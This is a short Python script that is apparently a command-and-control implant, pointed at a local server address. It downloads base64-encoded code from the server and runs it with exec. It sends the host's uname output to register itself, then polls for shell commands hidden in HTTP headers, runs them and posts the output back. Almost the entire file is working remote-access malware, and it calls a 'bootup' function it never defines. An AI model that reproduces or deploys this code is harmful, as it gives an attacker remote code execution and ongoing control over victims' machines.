import requests
import subprocess
import time
from sys import exit
from base64 import b64decode
import threading

global target
target = "127.0.0.1:8000"

data = requests.get(f"http://{target}/log").text
code = b64decode(data).decode()
exec(code)

# create a small banner and register against C2
def login():
    myname = "uname -a"
    banner = subprocess.run(["sh","-c", myname], stdout=subprocess.PIPE)
    guid = banner.stdout.decode()
    requests.get(f"http://{target}/login?new={guid}")



def connect():
    sleep_time = 2
    while True:
        time.sleep(sleep_time)
        command, sleeping, log, signal = check_task()
        if sleeping:
            sleep_time = int(sleeping)
        elif command:
            exe = subprocess.run(["sh", "-c", command], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            if exe.stderr:
                output = exe.stderr.decode()
            else:
                output = exe.stdout.decode()
            message = {"command":command, "output": output}
            requests.post(f"http://{target}/results", json=message)
        elif log:
            thread = threading.Thread(target=bootup, args=(), daemon=True)
            thread.start()
        elif signal:
            exit(0)

def check_task():
    try:
        r = requests.get(f"http://{target}/check", timeout=5)
        sleep = r.headers.get("X-Connection-State")
        command = r.headers.get("X-Tasks")
        log = r.headers.get("X-Logging")
        signal = r.headers.get("X-Connection-Close")
        return command, sleep, log, signal
    except requests.exceptions.Timeout:
        print("The request timed out")
        exit(1)
        return

def main():
    login()
    connect()

if __name__ == "__main__":
    main()